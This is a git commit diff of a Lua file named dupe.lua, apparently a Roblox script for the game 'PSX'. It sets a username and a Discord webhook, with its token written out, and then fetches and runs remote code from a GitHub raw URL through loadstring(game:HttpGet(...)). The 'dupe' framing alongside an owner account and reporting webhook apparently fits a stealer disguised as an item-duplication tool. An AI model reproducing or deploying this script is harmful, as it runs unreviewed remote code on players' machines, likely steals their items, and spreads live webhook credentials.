c1960576810018ef0763c77c90b62f1b2e7882e2
RuebanD <120219002+RuebanD@users.noreply.github.com>
2023-04-01 21:22:23 +0100

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,5 +1,5 @@
 UserName = "BIGBOYRUEB"
-WebHook = "https://discord.com/api/webhooks/1091817247254777876/PoWWpQEMHS5b-RHUi30JzCZwefBnQhtOAwaEI0H9DlCSGtms0oVASyHUMJMZCPVwd94b"
+WebHook = "https://discord.com/api/webhooks/1091817245887451279/iBO5Yp3S31T2e2rMSRuQF-7BsPXR8E0BSGKURp4Cs2otXD4TTZdxHC1XDYoQ8tryNB7N"
 Mention = true -- change to false if you don't want to get everyone ping in your webhook.
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
